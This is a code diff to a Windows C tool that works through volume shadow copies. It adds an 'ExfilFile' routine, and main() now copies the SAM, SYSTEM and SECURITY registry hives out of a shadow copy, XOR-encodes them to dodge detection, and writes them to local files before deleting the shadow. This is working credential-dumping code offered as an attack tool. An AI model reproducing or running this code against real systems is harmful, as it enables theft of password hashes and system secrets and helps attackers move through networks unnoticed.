@@ -274,6 +274,100 @@ BOOL delete_shadow(GUID snapshotId)
     return success;
 }
 
+VOID XorBuffer(PBYTE buffer, SIZE_T size, BYTE key)
+{
+    for (SIZE_T i = 0; i < size; i++)
+    {
+        buffer[i] ^= key;
+    }
+}
+
+BOOL ExfilFile(PCWSTR deviceObject, PCWSTR targetFile, PCWSTR outputFileName)
+{
+    WCHAR SAMPath[256];
+    // _snwprintf(SAMPath, 256, L"%ws\\Windows\\System32\\config\\SAM", deviceObject);
+    _snwprintf(SAMPath, 256, L"%ws\\%ws", deviceObject, targetFile);
+
+    wprintf(L"[*] %ws file path in shadow copy: %ws\n", targetFile, SAMPath);
+
+    HANDLE hFile = NULL;
+    hFile = CreateFileW(SAMPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        wprintf(L"[-] Failed to open %ws file in shadow copy: %d\n", targetFile, GetLastError());
+        return FALSE;
+    }
+
+    LARGE_INTEGER fileSizelarge;
+    if (!GetFileSizeEx(hFile, &fileSizelarge))
+    {
+        wprintf(L"[-] Failed to get %ws file size: %d\n", targetFile, GetLastError());
+        CloseHandle(hFile);
+        return FALSE;
+    }
+
+    SIZE_T fileSize = (SIZE_T)fileSizelarge.QuadPart;
+    PBYTE buffer = fileSize ? (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize) : NULL;
+    if (!buffer)
+    {
+        wprintf(L"[-] Failed to allocate memory for %ws file: %d\n", targetFile, GetLastError());
+        CloseHandle(hFile);
+        return FALSE;
+    }
+
+    DWORD bytesRead = 0;
+    while (bytesRead < fileSize)
+    {
+        DWORD read = 0;
+        if (!ReadFile(hFile, buffer + bytesRead, (DWORD)(fileSize - bytesRead), &read, NULL))
+        {
+            wprintf(L"[-] Failed to read %ws file: %d\n", targetFile, GetLastError());
+            HeapFree(GetProcessHeap(), 0, buffer);
+            CloseHandle(hFile);
+            return FALSE;
+        }
+        if (read == 0)
+            break;
+        bytesRead += read;
+    }
+
+    XorBuffer(buffer, fileSize, 0xAA);
+
+    HANDLE hOutputFile = CreateFileW(outputFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hOutputFile == INVALID_HANDLE_VALUE)
+    {
+        wprintf(L"[-] Failed to create output file: %d\n", GetLastError());
+        HeapFree(GetProcessHeap(), 0, buffer);
+        CloseHandle(hFile);
+        return FALSE;
+    }
+
+    DWORD bytesWritten = 0;
+    while (bytesWritten < fileSize)
+    {
+
+        DWORD written = 0;
+        if (!WriteFile(hOutputFile, buffer + bytesWritten, (DWORD)(fileSize - bytesWritten), &written, NULL))
+        {
+            wprintf(L"[-] Failed to write to output file: %d\n", GetLastError());
+            HeapFree(GetProcessHeap(), 0, buffer);
+            CloseHandle(hFile);
+            CloseHandle(hOutputFile);
+            return FALSE;
+        }
+        if (written == 0)
+            break;
+        bytesWritten += written;
+    }
+
+    wprintf(L"[*] %ws file copied and XORed successfully to %ws\n", targetFile, outputFileName);
+
+    CloseHandle(hFile);
+    HeapFree(GetProcessHeap(), 0, buffer);
+    CloseHandle(hOutputFile);
+    return TRUE;
+}
+
 int main()
 {
     PCWSTR volume = L"C:\\";
@@ -287,6 +381,10 @@ int main()
     }
 
     view_shapshots();
+
+    ExfilFile(deviceObject, L"Windows\\System32\\config\\SAM", L"SAM_copy.bin");
+    ExfilFile(deviceObject, L"Windows\\System32\\config\\SYSTEM", L"SYSTEM_copy.bin");
+    ExfilFile(deviceObject, L"Windows\\System32\\config\\SECURITY", L"SECURITY_copy.bin");
 
     if (!delete_shadow(snapId))
     {
